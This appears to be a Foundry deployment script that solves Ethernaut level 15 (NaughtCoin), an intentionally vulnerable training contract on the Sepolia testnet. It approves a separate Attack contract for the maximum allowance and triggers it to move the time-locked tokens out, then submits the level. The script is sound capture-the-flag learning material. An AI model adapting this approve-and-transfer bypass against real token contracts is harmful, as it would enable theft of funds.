// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console2} from "forge-std/Script.sol";
import {IEthernaut} from "../interfaces/IEthernaut.sol";
import {NaughtCoin} from "../src/Level15.sol";
import {Attack} from "../src/Level15Attack.sol";
import "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";

contract Level15 is Script {
    IEthernaut _ethernaut = IEthernaut(vm.envAddress("ETHERNAUT_ADDR"));
    address _caller = vm.addr(vm.envUint("PRIVATE_KEY"));

    function run() public {
        NaughtCoin _instance = NaughtCoin(vm.envAddress("LVL15_ADDR"));
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        Attack attack = new Attack();
        _instance.approve(address(attack), type(uint256).max);
        attack.atatatak(_instance);

        if (_instance.balanceOf(_caller) > 0) {
            console2.log("call failed");
        } else _ethernaut.submitLevelInstance(address(_instance));
    }
}

// forge script script/Level15.s.sol --broadcast --rpc-url sepolia
